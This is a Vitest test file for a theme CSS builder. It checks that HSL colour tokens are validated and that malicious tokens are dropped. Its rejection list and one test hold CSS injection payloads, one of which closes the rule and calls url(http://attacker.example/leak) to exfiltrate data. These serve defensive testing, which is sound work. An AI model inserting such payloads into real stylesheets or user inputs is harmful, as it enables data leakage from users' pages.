import { describe, expect, it } from 'vitest';
import { buildThemeCss, HSL_COMPONENT_RE } from '../src/services/reports/themeCss.js';

describe('HSL_COMPONENT_RE', () => {
  it('accepts the HSL component triples the theme system emits', () => {
    for (const ok of ['158 62% 32%', '0 0% 100%', '265 89% 78%', '14.5 51% 63.2%']) {
      expect(HSL_COMPONENT_RE.test(ok)).toBe(true);
    }
  });

  it('rejects anything that is not a bare H S% L% triple', () => {
    for (const bad of [
      'red',
      '#ff0000',
      'hsl(0 0% 0%)',
      '0 0% 0',                 // missing trailing %
      '0 0% 0%; }',             // rule-closing injection
      'url(http://evil/x)',
      '',
    ]) {
      expect(HSL_COMPONENT_RE.test(bad)).toBe(false);
    }
  });
});

describe('buildThemeCss', () => {
  it('emits a resolved value for a valid token', () => {
    const css = buildThemeCss({ mode: 'light', primary: '210 80% 40%' });
    expect(css).toContain('--primary: 210 80% 40%;');
  });

  it('drops an injection payload and falls back to the mode default', () => {
    // A crafted token that tries to close the rule and exfiltrate via url().
    const malicious = '0 0% 0%; } body { background: url(http://attacker.example/leak) } :root {';
    const css = buildThemeCss({ mode: 'light', primary: malicious });

    // The payload must NOT reach the rendered CSS...
    expect(css).not.toContain('attacker.example');
    expect(css).not.toContain('url(');
    // ...and the default light-mode primary must still be present.
    expect(css).toContain('--primary: 158 62% 32%;');
  });

  it('ignores missing/blank tokens without emitting invalid declarations', () => {
    const css = buildThemeCss({ mode: 'dark', primary: undefined, accent: '   ' });
    expect(css).not.toContain('undefined');
    expect(css).not.toContain('--accent:    ;');
    // dark defaults are present
    expect(css).toContain('--primary: 158 64% 52%;');
  });
});
